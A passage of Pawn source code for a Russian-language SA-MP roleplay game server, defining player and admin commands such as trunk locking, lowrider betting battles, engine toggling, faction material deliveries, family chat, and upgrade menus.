                static const fmt_strin1g[] = "Вы %s багажник";
				new s1tr[sizeof(fmt_strin1g)+20];
				format(s1tr, sizeof(s1tr), fmt_strin1g,(BInfo[c][bLock]) ? ("открыли") : ("закрыли"));
    			SendClientMessage(playerid,CREWARD,s1tr);
				static const fmt_string[] = "%s %s багажник";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],(BInfo[c][bLock]) ? ("открыл") : ("закрыл"));
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				SetPlayerChatBubble(playerid, "открыл/закрыт багажник", COLOR_PURPLE, 30.0, 7000);
                CarTrunk(c,(!BInfo[c][bLock]) ? (0) : (1));
				return 1;
      		}
      		full++;
      		break;
     	}
    }
    if(full == 0) return SendClientMessage(playerid,CGREY,"Вы не у багажника");
    return true;
}
CMD:lowride(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1067.2545,1758.1206,10.8203)) return SendClientMessage(playerid,CGREY,"Вы не рядом с парковкой для LowRide Battle");
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не за рулем транспорта");
	if(!GetVehicleComponentInSlot(GetPlayerVehicleID(playerid), CARMODTYPE_HYDRAULICS))  return SendClientMessage(playerid,CGREY,"У Вас нет гидравлики на трапспорте");
   	new kek = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(playerid) != VInfo[v][vcar]) continue;
		if(strcmp(VInfo[v][vname], PlayerInfo[playerid][pSendername], true) == 0) kek = v;
		break;
	}
	if(kek == 0) return SendClientMessage(playerid,CGREY,"Это не ваше транспортное средство");
	if(!IsLowRide(GetPlayerVehicleID(playerid)))  return SendClientMessage(playerid,CGREY,"Ваш транспорт не предназначен для LowRide Battle");
	if(sscanf(params, "ud", params[0], params[1])) return SendClientMessage(playerid, CGREY, "Введите: /lowride [id игрока] [ставка]");
	if(params[1] < 0 || params[1] > 100000) return SendClientMessage(playerid, CGREY, "Ставка от 0$ до 100000$");
	if(PlayerInfo[playerid][pCash] < params[1]) return SendClientMessage(playerid, CGREY, "Недостаточно средств");
	new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   	if(GetPlayerState(params[0]) != 2) return SendClientMessage(playerid,CGREY,"Игрок не за рулем транспорта");
	if(!GetVehicleComponentInSlot(GetPlayerVehicleID(params[0]), CARMODTYPE_HYDRAULICS))  return SendClientMessage(playerid,CGREY,"У игрока нет гидравлики на трапспорте");
   	new kek1 = 0;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(params[0]) != VInfo[v][vcar]) continue;
		if(strcmp(VInfo[v][vname], PlayerInfo[params[0]][pSendername], true) == 0) kek1 = v;
		break;
	}
	if(kek1 == 0) return SendClientMessage(playerid,CGREY,"Это не транспортное средство игрока");
	if(!IsLowRide(GetPlayerVehicleID(params[0])))  return SendClientMessage(playerid,CGREY,"Транспорт игрока не предназначен для LowRide Battle");
	if(PlayerInfo[params[0]][pCash] < params[1]) return SendClientMessage(playerid, CGREY, "У игрока недостаточно средств");
	if(GetPred(params[0]) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	SendClientMessage(playerid,CREWARD,"Вы предложили игроку посостязаться в LowRide Battle");
   	static const fmt_string1[] = "%s предложил Вам посостязаться в LowRide Battle. Ставка: $%i";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+3];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],params[1]);
	SendClientMessage(params[0],0xFF7F50FF,str1);
	SendClientMessage(params[0],CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
	SetPVarInt(params[0],"LowRideID",playerid+1);
	SetPVarInt(params[0],"LowRideStavka",params[1]);
	
	return true;
}
CMD:skill(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Введите: /skill [id игрока]");
    new Float:x,Float:y,Float:z;
    GetPlayerPos(params[0],x,y,z);
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
   	static const fmt_st2ring[] = "Навыки игрока: %s";
	new s3tr[sizeof(fmt_st2ring)+MAX_PLAYER_NAME];
	format(s3tr, sizeof(s3tr), fmt_st2ring,PlayerInfo[playerid][pSendername]);
    new percent[2] = "%";
	static const fmt_string[] = "{FFFFFF}Silenced 9mm:\t\t\t\t\t{f7ae11}%d%s{FFFFFF}\nDesert Eagle:\t\t\t\t\t{f7ae11}%d%s{FFFFFF}\nShotGun:\t\t\t\t\t{f7ae11}%d%s{FFFFFF}\nMP5\t\t\t\t\t\t{f7ae11}%d%s{FFFFFF}\nAK47:\t\t\t\t\t\t{f7ae11}%d%s{FFFFFF}\nM4:\t\t\t\t\t\t{f7ae11}%d%s{FFFFFF}";
	new str[sizeof(fmt_string)+4+1+4+1+4+1+4+1+4+1+4+1];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pGunSkill][0]/10,percent,PlayerInfo[playerid][pGunSkill][1]/10,percent,PlayerInfo[playerid][pGunSkill][2]/10,percent,PlayerInfo[playerid][pGunSkill][3]/10,
	percent,PlayerInfo[playerid][pGunSkill][4]/10,percent,PlayerInfo[playerid][pGunSkill][5]/10,percent);
	ShowPlayerDialog(params[0],0,DIALOG_STYLE_MSGBOX,s3tr,str,"Закрыть","");
	//=======s
	static const fmt_string1[] = "%s показал свои навыки игроку %s";
	new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
	format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
	SetPlayerChatBubble(playerid, "показал свои навыки", COLOR_PURPLE, 30.0, 7000);
	return true;
}

CMD:gglist(playerid)
{
	new str[400],str1[45];
	strcat(str,"{FFFFFF}№\tИмя\t\t[Уровень | Убийства]\n\n");
	for(new i = 0; i <= 7; i++)
	{
		format(str1,sizeof(str1),"№%i.\t%s\t[%d | %d]\n",i+1,InfoGG[i][gName],InfoGG[i][gLevel],InfoGG[i][gKills]);
		strcat(str,str1);
	}
	return ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Участники GunGame",str,"Далее","");
}

CMD:en(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER || IsInv(GetPlayerVehicleID(playerid)) || IsAPlane(playerid)) return true;
	if(Fuel[GetPlayerVehicleID(playerid)] <= 0 && !IsAPlane(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, CGREY, "В транспорте закончился бензин");
	new Float:health;
	GetVehicleHealth(GetPlayerVehicleID(playerid),health);
	if(health < 300) return SendClientMessage(playerid, CGREY, "Двигатель заглох, вызовите механика /call 911");
	new kek1 = 0;
	for(new i = 1; i <= TOTALCJ; i++)
	{
		if(GetPlayerVehicleID(playerid) != CarJob[i][jcar]) continue;
	 	kek1++;
		break;
	}
	if((GetPlayerVehicleID(playerid) >= rentcar[0] && GetPlayerVehicleID(playerid) <= rentcar[1] || kek1 > 0) && RentCar[GetPlayerVehicleID(playerid)] == -1) return true;
	for(new v = 1; v <= TOTALV; v++)
	{
	    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
		if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
		{
		    if(VInfo[v][vkeys] == 0) return SendClientMessage(playerid,CGREY,"В данном транспортном средстве нет ключей | Вставить ключи: /keys");
		    break;
		}
	}
	SetEngine(playerid,GetPlayerVehicleID(playerid),(!Engine[GetPlayerVehicleID(playerid)]) ? (true) : (false));
	return 1;
}
/*CMD:ass(playerid)
{
    if(!PlayerInfo[playerid][pAdmin]) return 1;
	StartTimeGG = 10;
	return 1;
}
CMD:gog(playerid)
{
    if(!PlayerInfo[playerid][pAdmin]) return 1;
	StartDog();
	return 1;
}*/
CMD:startrace(playerid)
{
    if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
    StartTime = 300;
    StartReg = 1;
    SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}Объявлена регистрация на 'Kart Racing'. Начало через 5 минут.");
    return 1;
}
CMD:startgg(playerid)
{
    if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
    StartTimeGG = 300;
    StartRegGG = 1;
    SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}Объявлена регистрация на 'GunGame'. Начало через 5 минут.");
    return 1;
}
/*CMD:quest(playerid)
{
	switch(PlayerInfo[playerid][pQuest])
	{
	    case 1:
	    {
			static const fmt_string[] = "{FFFFFF}Первое дело.\n\nПрогресс:\nПринесено ящиков:{f7ae11}\t%d/15{FFFFFF}\nПринесено аптечек:{f7ae11}\t%d/15{FFFFFF}\nПринесено мешков:{f7ae11}\t%d/15{FFFFFF}\n\nВаша задача:\nОтправляйтесь на склад, завод по изготовлению аптечек и на добычу песка.\nОтработайте везде по смене, сделав не менее 15 заходов.\nДанное задание должно быть выполнено за одну ссесию. При выходе из игры весь прогресс будет аннулирован.\nМесто нахождения работ вы можете найти в /gps.";
            new str[sizeof(fmt_string)];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pQ][0],PlayerInfo[playerid][pQ][1],PlayerInfo[playerid][pQ][2]);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Первое дело",str,"Далее","");
		}
		case 2:
	    {
			static const fmt_string[] = "{FFFFFF}Помощь в развитии.\n\nПрогресс:\nПрава на автомобиль:{f7ae11}\t%s{FFFFFF}\nВыполнено рейсов:{f7ae11}\t\t%d/5{FFFFFF}\n\nВаша задача:\nОтправляйтесь в автошколу, если вы еще не получили права на автомобиль и получите их.\nПосле получения прав, следуйте в автобусную компанию и выйдите на первый рабочий день. Выполните норму в 5 рейсов.\nМесто нахождения автошколы и автобусного парка вы можете найти в /gps.";
            new str[sizeof(fmt_string)+5];
			format(str, sizeof(str), fmt_string,(!PlayerInfo[playerid][pLic][0]) ? ("Нет"):("Есть"),PlayerInfo[playerid][pQ][0]);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Помощь в развитии",str,"Далее","");
		}
		case 3:
	    {
			static const fmt_string[] = "{FFFFFF}Серьезное предложение.\n\nПрогресс:\nНаходитесь ли в криминальной организации:{f7ae11}\t\t%s{FFFFFF}\nИмеються ли 15.000$:{f7ae11}\t\t\t\t\t%s{FFFFFF}\n\nВаша задача:\nВам предстоит вступить в одну из криминальных организаций.\nВ зависимости от нации вашего персонажа выберите подходящую и отправляйтесь к ним на район. Узнать их местонахождение можно RolePlay путем.";
            new str[sizeof(fmt_string)+110+20];
			format(str, sizeof(str), fmt_string,(!IsACapture(playerid)) ? ("Нет"):("Да"),(PlayerInfo[playerid][pCash] > 15000) ? ("Да"):("Нет"));
			strcat(str,"\nПосле того, как вступите вы должны отработать там до того момента, пока у вас на руках не будет 15.000$.");
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Серьезное предложение",str,"Далее","");
		}
		case 4:
	    {
	        new kek = 0;
		   	for(new i = 1; i<= TOTALV; i++)
		   	{
		   		if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
		   	    if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0)
				{
				    kek++;
				    break;
				}
			}
			static const fmt_string[] = "{FFFFFF}Небольшой расход.\n\nПрогресс:\n6 уровень:{f7ae11}\t\t%s{FFFFFF}\nДом:{f7ae11}\t\t\t%s{FFFFFF}\nТранспорт:{f7ae11}\t\t%s{FFFFFF}\n\nВаша задача:\nВы должны достигнуть 6 игрового уровня, купить себе любой дом и автомобиль.";
            new str[sizeof(fmt_string)+15];
			format(str, sizeof(str), fmt_string,(PlayerInfo[playerid][pLevel] > 5) ? ("Есть"):("Нет"),(GetPlayerHouse(playerid)) ? ("Есть"):("Нет"),(kek) ? ("Есть"):("Нет"));
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Небольшой расход",str,"Далее","");
		}
	    default: SendClientMessage(playerid,CGREY,"Вы не брали нового задания!");
	}
	return 1;
}*/
CMD:createactor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6) return 1;
    if(sscanf(params, "d", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /createactor [id]");
    new Float:x,Float:y,Float:z,Float:fa;
    GetPlayerPos(playerid,x,y,z);
    GetPlayerFacingAngle(playerid,fa);
	new act2 = CreateDynamicActor(params[0],x,y,z,fa,1,100.0,GetPlayerVirtualWorld(playerid));
	new animlib[32];
    new animname[32];
    GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
	ApplyDynamicActorAnimation(act2,animlib,animname,4.1,1,0,0,0,0);
	ApplyDynamicActorAnimation(act2,animlib,animname,4.1,1,0,0,0,0);
//	SetActorVirtualWorld(act2,GetPlayerVirtualWorld(playerid));
	query = "";
	format(query,sizeof(query),"INSERT INTO `actors` ( `skinid`, `x`, `y`, `z`, `fa`, `virt`, `animl`, `animn`) \
	VALUES ('%d', '%f', '%f', '%f', '%f', '%d', '%s', '%s')",params[0],x,y,z,fa,GetPlayerVirtualWorld(playerid),animlib,animname);
	mysql_tquery(mysql,query);
	return 1;
}

/*static const Float:shkafdom[][4] = {
{140.0,147.596328,1372.630371,1088.367187},
{261.0,254.933486,1255.107299,1084.257812},
{234.0,241.903533,1075.275024,1084.187500},
{328.0,329.507904,1490.843383,1084.437500},
{2238.0,2240.958007,-1071.919799,1049.023437},
{24.0,23.479139,1349.004394,1088.875000},
{2260.0,2260.391113,-1139.208984,1050.632812},
{2197.0,2187.965087,-1213.348754,1049.023437},
{2318.0,2326.986572,-1015.418029,1054.711059},
{2365.0,2360.797607,-1130.819335,1050.875000},
{2283.0,2285.446289,-1136.637817,1050.898437},
{2218.0,2208.064941,-1071.413085,1050.476562},
{-43.0,-45.919696,1401.220825,1084.437011},
{83.0,84.358940,1331.884399,1083.869018},
{447.0,451.750000,1408.621704,1084.307983},
{235.0,233.542877,1209.737060,1084.374023},
{226.0,217.529602,1251.208740,1082.148071},
{244.0,248.817382,303.971435,999.148437},
{2468.0,2462.406494,-1697.757812,1013.507812},
{422.0,413.116394,2536.809326,10.000000},
{443.0,444.486633,514.111450,1001.419494},
{2324.0,2311.218750,-1135.982177,1054.304687},
{2808.0,2818.961181,-1166.921752,1029.171875},
{2234.0,2231.736816,-1112.229736,1050.882812},
{222.0,217.539276,1154.215087,1082.616821},
{377.0,371.7657,1461.0792,1080.1949}
};
CMD:gogo(playerid)
{
    if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	for(new i = 1; i <= TOTALHOUSE; i++)
	{
	    for(new s = 0; s <= 25; s++)
		{
			if(floatround(HInfo[i][hXX]) == floatround(shkafdom[s][0]) || floatround(HInfo[i][hXX])-1  == floatround(shkafdom[s][0]) || floatround(HInfo[i][hXX])+1  == floatround(shkafdom[s][0]))
			{
                format(query, sizeof(query), "UPDATE testhouse SET 	shkafx ='%f',shkafy ='%f',shkafz ='%f' WHERE id = '%d' LIMIT 1",shkafdom[s][1],shkafdom[s][2],shkafdom[s][3],i);
				mysql_tquery(mysql,query);
			}
		}
	}
	return true;
}*/
CMD:unrent(playerid)
{
    if(PlayerLogged[playerid] == false || GetPVarInt(playerid,"RentCar") == 0) return 1;
   	RentCar[GetPVarInt(playerid,"RentCar")] = -1;
   	Locked[GetPVarInt(playerid,"RentCar")] = -1;
   	SetVehicleToRespawn(GetPVarInt(playerid,"RentCar"));
	DeletePVar(playerid,"RentCar");
	return SendClientMessage(playerid,-1,"Вы отказались от аренды транспорта");
}
CMD:loadmats(playerid)
{
	if(PlayerInfo[playerid][pMember] != F_ARMY) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда!");
	if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 433) return SendClientMessage(playerid,CGREY,"Вы не в машине для перевозки материалов");
	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 153.9975,1879.2290,18.0805)) return SendClientMessage(playerid,CGREY,"Вы не рядом с заводом!");
	static const fmt_string1[] = "{ffffff}Склад Армия 'Зона 51': %d шт.\nСклад LSPD: %d шт.\nСклад LVPD: %d шт.\nСклад FBI: %d шт.";
	new str1[sizeof(fmt_string1)+10];
	format(str1, sizeof(str1), fmt_string1,FracMats[F_ARMY],FracMats[F_LSPD],FracMats[F_LVPD],FracMats[F_FBI]);
	ShowPlayerDialog(playerid,441,DIALOG_STYLE_LIST,"Информация",str1,"Далее","Отмена");
	
/*	new materials;
	if(FracMats[F_ARMY] >= 5000) materials = 5000;
	else if(FracMats[F_ARMY] > 0) materials = FracMats[F_ARMY];
	else return SendClientMessage(playerid,CGREY,"На складе недостаточно материалов!");
	if(BInfo[GetPlayerVehicleID(playerid)][bMats]+materials > 5000) return SendClientMessage(playerid,CGREY,"В транспорте не хватает места");
	BInfo[GetPlayerVehicleID(playerid)][bMats] += materials;
	FracMats[F_ARMY] -= materials;
	SetMatsInt("armysamats",FracMats[F_ARMY]);
	static const fmt_string[] = "[R] %s загрузил в транспорт %d материалов. На складе: %i материалов";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],materials,FracMats[PlayerInfo[playerid][pMember]]);
	SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
	static const fmt_str2ing[] = "Вы загрузили в транспорт %i материалов. Теперь в транспорте: %d";
	new str2[sizeof(fmt_str2ing)+4];
	format(str2, sizeof(str2), fmt_str2ing,materials,BInfo[GetPlayerVehicleID(playerid)][bMats]);
	SendClientMessage(playerid,CREWARD,str2);
	SendClientMessage(playerid,CREWARD,"Выгрузить: /unload (на парковке)");
	UpdateArmy();*/
	return 1;
}
CMD:unload(playerid)
{
	if(PlayerInfo[playerid][pMember] != F_ARMY && !IsAGang(playerid) && !IsAMafia(playerid) && PlayerInfo[playerid][pMember] != F_HOSPITAL_LS) return SendClientMessage(playerid,CGREY,"Вам недоступна данная команда!");
	if((PlayerInfo[playerid][pMember] == F_ARMY ||  PlayerInfo[playerid][pMember] == F_HOSPITAL_LS) && !PlayerInfo[playerid][pWork]) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
//	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 573) return SendClientMessage(playerid,CGREY,"Вы не в машине для перевозки материалов");
//	if(!IsPlayerInRangeOfPoint(playerid, 5.0, 153.9975,1879.2290,18.0805)) return SendClientMessage(playerid,CGREY,"Вы не рядом с заводом!");
	
//	if(BInfo[GetPlayerVehicleID(playerid)][bWork]+params[0] > 5000) return SendClientMessage(playerid,CGREY,"В транспорте не хватает места");
	if(PlayerInfo[playerid][pMember] == F_ARMY)
	{
	    if(!BInfo[GetPlayerVehicleID(playerid)][bMats]) return SendClientMessage(playerid,CGREY,"В транспорте нет материалов!");
		if(IsPlayerInRangeOfPoint(playerid, 30.0, 2291.4824,2466.8613,10.5018)) //army
		{
		    Unloads(playerid,F_ARMY);
		    
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 2291.0505,2468.5820,10.8203)) //lvpd
		{
            if(!PlayerInfo[playerid][pQuestS][18])
			{
				PlayerQuest[playerid][18][0]++;
				CheckQuest(playerid,18);
			}
		    Unloads(playerid,F_LVPD);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 988.0936,1078.4991,10.8130)) //fbi
		{
		
            if(!PlayerInfo[playerid][pQuestS][18])
			{
				PlayerQuest[playerid][18][0]++;
				CheckQuest(playerid,18);
			}
			Unloads(playerid,F_FBI);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 1563.8132,-1697.5740,5.8970)) //lspd
		{
		    if(!PlayerInfo[playerid][pQuestS][18])
			{
				PlayerQuest[playerid][18][0]++;
				CheckQuest(playerid,18);
			}
		    Unloads(playerid,F_LSPD);
		}
		else SendClientMessage(playerid,CGREY,"Вы должны быть около оружейной");
	}
	else if(PlayerInfo[playerid][pMember] == F_HOSPITAL_LS)
	{
	    if(!BInfo[GetPlayerVehicleID(playerid)][bHeal]) return SendClientMessage(playerid,CGREY,"В транспорте нет аптечек!");
	    if(IsPlayerInRangeOfPoint(playerid, 30.0, 1185,-1323.37,13.573)) //lspd
	    {
	        HosAp += BInfo[GetPlayerVehicleID(playerid)][bHeal];
			SetMatsInt("HosAp",HosAp);
			SetTimer("UpdAp",300,false);
			static const fmt_string[] = "[R] %s выгрузил %d аптечек. На складе: %i аптечек";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],BInfo[GetPlayerVehicleID(playerid)][bHeal],HosAp);
			SendFMes(F_HOSPITAL_LS,COLOR_SKLAD,str);
			InvTrunkMinus(GetPlayerVehicleID(playerid),456,BInfo[GetPlayerVehicleID(playerid)][bHeal]);
			static const fmt_str2ing[] = "Вы выгрузили %i аптечек!";
			new str2[sizeof(fmt_str2ing)+4];
			format(str2, sizeof(str2), fmt_str2ing,BInfo[GetPlayerVehicleID(playerid)][bHeal]);
			SendClientMessage(playerid,CREWARD,str2);
			BInfo[GetPlayerVehicleID(playerid)][bHeal] = 0;
	    }
	    else SendClientMessage(playerid,CGREY,"Вы должны быть около входа в больницу");
	}
	else if(IsAGang(playerid) || IsAMafia(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid, 30.0, 2495.7227,-1682.4080,13.3462) && PlayerInfo[playerid][pMember] == F_GROVE) //grove
		{
		    Unloads(playerid,F_GROVE);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 2261.6287,-1896.0449,13.3789) && PlayerInfo[playerid][pMember] == F_RIFA) //grove
		{
		    Unloads(playerid,F_RIFA);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 1885.4347,-2025.3674,13.3906) && PlayerInfo[playerid][pMember] == F_AZTECAS) //grove
		{
		    Unloads(playerid,F_AZTECAS);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 2811.0408,-1180.6888,25.2930) && PlayerInfo[playerid][pMember] == F_VAGOS) //grove
		{
		    Unloads(playerid,F_VAGOS);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 1999.8546,-1119.6022,26.7813) && PlayerInfo[playerid][pMember] == F_BALLAS) //grove
		{
		    Unloads(playerid,F_BALLAS);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, -238.6276,2602.2534,62.7031) && PlayerInfo[playerid][pMember] == F_BIKERS) //grove
		{
		    Unloads(playerid,F_BIKERS);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0,1466.0945,2771.3066,10.6719) && PlayerInfo[playerid][pMember] == F_LCN) //grove
		{
		    Unloads(playerid,F_LCN);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0,2616.3401,1715.8500,10.8203) && PlayerInfo[playerid][pMember] == F_YAKUZA) //grove
		{
		    Unloads(playerid,F_YAKUZA);
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0,-302.3130,1308.8000,53.8784) && PlayerInfo[playerid][pMember] == F_RM) //grove
		{
		    Unloads(playerid,F_RM);
		}
	    else SendClientMessage(playerid,CGREY,"Вы должны быть на спавне своей организации");
	}
	
	return 1;
}
CMD:fc(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pFam] == 0) return SendClientMessage(playerid,CGREY,"Вы не состоите в семье");
    if(sscanf(params, "s[144]", params)) return SendClientMessage(playerid, CGREY, "Используйте: /fc [текст]");
    static const fmt_string[] = "[%s] %s[%d]: %s";
	new str[sizeof(fmt_string)+32+4+144+50];
	format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername],playerid,params);
	SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
	return true;
}
CMD:family(playerid)
{
    if(PlayerLogged[playerid] == false) return 1;
    if(PlayerInfo[playerid][pFam] == 0) return SendClientMessage(playerid,CGREY,"Вы не состоите в семье");
    if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0)
    {
        ShowPlayerDialog(playerid,233,DIALOG_STYLE_LIST,"Панель семьи","1 | Состав семьи\n2 | Составь семьи онлайн\n3 | Общак семьи\n4 | Автопарк\n5 | Настройки\n6 | Улучшения","Далее","Отмена");
    }
    else ShowPlayerDialog(playerid,233,DIALOG_STYLE_LIST,"Панель семьи","1 | Состав семьи\n2 | Составь семьи онлайн\n3 | Общак семьи\n4 | Автопарк","Далее","Отмена");
	return true;
}
stock ShowHouseUl(playerid)
{
	new fam = GetPVarInt(playerid,"PlayerHouse");
	new cena1[30];
	new cena2[30];
	new cena3[30];
	format(cena1,sizeof(cena1),"{F85A5A}[%d$]{ffffff}",HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*3);
	format(cena2,sizeof(cena2),"{F85A5A}[%d$]{ffffff}",HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*10);
	format(cena3,sizeof(cena3),"{F85A5A}[%d$]{ffffff}",HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/100*6);
	static const fmt_string[] = "1 | Гардероб\t%s\n2 | Субсидия\t%s\n3 | Увеличить шкаф\t%s";
	new str[sizeof(fmt_string)+30*4];
	format(str, sizeof(str), fmt_string,(!HInfo[fam][hUl][0]) ? (cena1):("{20BA09}[Куплено]{ffffff}")
	,(!HInfo[fam][hUl][1]) ? (cena2):("{20BA09}[Куплено]{ffffff}")
	,(!HInfo[fam][hUl][2]) ? (cena3):("{20BA09}[Куплено]{ffffff}"));
	return ShowPlayerDialog(playerid,370,DIALOG_STYLE_TABLIST,"Улучшения",str,"Далее","Отмена");
}
stock ShowFamUl(playerid)
{
	new fam = PlayerInfo[playerid][pFam];
	static const fmt_string[] = "1 | Увеличение мест в семье\t%s\n2 | Увеличенный автопарк\t%s\n3 | Тюнинг транспорта\t%s"; /*\nПодкуп властей\t\t%s";*/
	new str[sizeof(fmt_string)+30*4];
	format(str, sizeof(str), fmt_string,(!FamInfo[fam][fUl][0]) ? ("{F85A5A}[50 Donate Point]{FFFFFF}"):("{20BA09}[Куплено]{FFFFFF}")
	,(!FamInfo[fam][fUl][1]) ? ("{F85A5A}[75 Donate Point]{FFFFFF}"):("{20BA09}[Куплено]{FFFFFF}")
	,(!FamInfo[fam][fUl][2]) ? ("{F85A5A}[100 Donate Point]{FFFFFF}"):("{20BA09}[Куплено]{FFFFFF}"));
	return ShowPlayerDialog(playerid,463,DIALOG_STYLE_TABLIST,"Улучшения",str,"Далее","Отмена");
}
stock ShowPUl(playerid)
{
	static const fmt_string[] = "1 | Обжора\t%s\n2 | Стрелок\t%s";
	new str[sizeof(fmt_string)+30*4];
	format(str, sizeof(str), fmt_string,(!PlayerInfo[playerid][pUl][0]) ? ("{F85A5A}[5000$]{FFFFFF}"):("{20BA09}[Куплено]{FFFFFF}")
	,(!PlayerInfo[playerid][pUl][1]) ? ("{F85A5A}[5000$]{FFFFFF}"):("{20BA09}[Куплено]{FFFFFF}"));
	return ShowPlayerDialog(playerid,338,DIALOG_STYLE_TABLIST,"Улучшения",str,"Далее","Отмена");
}
stock ShowBizUl(playerid)
{
	new fam = GetPVarInt(playerid,"PlayerBiz");
	new cena1[30];
	new cena2[30];
	new cena3[30];
	new cena4[30];
	new cena5[30];
	
	format(cena1,sizeof(cena1),"{F85A5A}[%d$]{FFFFFF}",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10);
	format(cena2,sizeof(cena2),"{F85A5A}[%d$]{FFFFFF}",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10);
	format(cena3,sizeof(cena3),"{F85A5A}[%d$]{FFFFFF}",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*10);
	format(cena4,sizeof(cena4),"{F85A5A}[%d$]{FFFFFF}",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*8);
	format(cena5,sizeof(cena5),"{F85A5A}[%d$]{FFFFFF}",BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice]/100*5);
	static const fmt_string[] = "1 | Расширение склада/места\t%s\n2 | Дополнительное рабочее место\t%s\n3 | Добавить бизнес в GPS-навигатор\t%s\n4 | Добавить звук при входе\t%s\n5 | Оплата банковской картой\t%s";
	new str[sizeof(fmt_string)+30*4];
	format(str, sizeof(str), fmt_string,(!BizInfo[fam][bUl][0]) ? (cena1):("{20BA09}[Куплено]{FFFFFF}")
	,(!BizInfo[fam][bUl][1]) ? (cena2):("{20BA09}[Куплено]{FFFFFF}")
	,(!BizInfo[fam][bUl][2]) ? (cena3):("{20BA09}[Куплено]{FFFFFF}")
